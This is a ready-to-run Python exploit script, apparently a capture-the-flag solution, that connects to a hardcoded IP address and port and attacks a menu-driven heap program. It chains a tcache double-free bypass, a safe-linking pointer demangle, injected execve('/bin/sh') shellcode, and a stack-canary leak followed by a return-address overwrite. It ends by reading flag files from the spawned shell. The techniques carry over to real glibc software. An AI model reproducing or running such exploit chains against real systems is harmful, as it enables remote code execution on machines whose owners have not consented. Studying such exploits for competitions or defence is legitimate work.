#!/usr/bin/env python3
import socket
import struct
import sys
import time

HOST = "154.57.164.67"
PORT = 30733


def p64(value):
    return struct.pack("<Q", value)


def u64(value):
    return struct.unpack("<Q", value.ljust(8, b"\0"))[0]


def demangle(leak):
    """Invert glibc safe-linking for leak = address ^ (address >> 12)."""
    address = leak
    for _ in range(5):
        address = leak ^ (address >> 12)
    return address


class Tube:
    def __init__(self, host, port):
        self.sock = socket.create_connection((host, port), timeout=8)
        self.buf = bytearray()

    def recvuntil(self, marker, timeout=8):
        deadline = time.monotonic() + timeout
        while marker not in self.buf:
            remaining = deadline - time.monotonic()
            if remaining <= 0:
                raise TimeoutError(f"waiting for {marker!r}; buffered {bytes(self.buf)!r}")
            self.sock.settimeout(remaining)
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(bytes(self.buf))
            self.buf += chunk
        end = self.buf.index(marker) + len(marker)
        result = bytes(self.buf[:end])
        del self.buf[:end]
        return result

    def send(self, data):
        self.sock.sendall(data)

    def sendline(self, data):
        self.send(data + b"\n")

    def sendlineafter(self, marker, data):
        self.recvuntil(marker)
        self.sendline(data)

    def drain(self, timeout=1.5):
        out = bytearray(self.buf)
        self.buf.clear()
        self.sock.settimeout(timeout)
        while True:
            try:
                chunk = self.sock.recv(4096)
                if not chunk:
                    break
                out += chunk
            except socket.timeout:
                break
        return bytes(out)


def choose(io, option):
    io.sendlineafter(b"> ", str(option).encode())


def create(io, slot):
    choose(io, 1)
    io.sendlineafter(b"Insert portal number: ", str(slot).encode())


def destroy(io, slot):
    choose(io, 2)
    io.sendlineafter(b"Insert portal number: ", str(slot).encode())


def upgrade(io, slot, data):
    choose(io, 3)
    io.sendlineafter(b"Insert portal number: ", str(slot).encode())
    io.sendlineafter(b"Enter data: ", data)


def exploit():
    io = Tube(HOST, PORT)

    # Bypass the tcache double-free check by overwriting both metadata words.
    create(io, 0)
    destroy(io, 0)
    upgrade(io, 0, b"A" * 16)
    destroy(io, 0)

    # The self-referential safe-linked fd discloses the exact chunk address.
    choose(io, 4)
    io.recvuntil(b"Data: ")
    mangled = u64(io.recvuntil(b"\n")[:-1][:6])
    heap = demangle(mangled)
    print(f"[+] mangled heap pointer: {mangled:#x}")
    print(f"[+] executable heap chunk: {heap:#x}")

    # execve(rsp, NULL, NULL); rsp will point to '/bin/sh' after ret.
    shellcode = bytes.fromhex("4889e731f631d26a3b580f05")
    upgrade(io, 0, shellcode.ljust(21, b"\x90"))

    choose(io, 5)
    io.recvuntil(b"> ")
    io.send(b"A" * 73)
    leaked_output = io.recvuntil(b"words: ")
    prefix = b"[!] Amazing option choosing " + b"A" * 73
    start = leaked_output.index(prefix) + len(prefix)
    leak = leaked_output[start:]
    canary = u64(b"\0" + leak[:7])
    saved_rbp = u64(leak[7:13])
    print(f"[+] stack canary: {canary:#x}")
    print(f"[+] saved rbp: {saved_rbp:#x}")

    payload = b"A" * 72 + p64(canary) + p64(saved_rbp) + p64(heap) + b"/bin/sh\0"
    assert len(payload) == 104
    io.send(payload)
    time.sleep(0.4)
    io.sendline(b"cat /flag* 2>/dev/null; cat flag* 2>/dev/null; id")
    output = io.drain(2.5)
    sys.stdout.buffer.write(output)
    return output


if __name__ == "__main__":
    exploit()
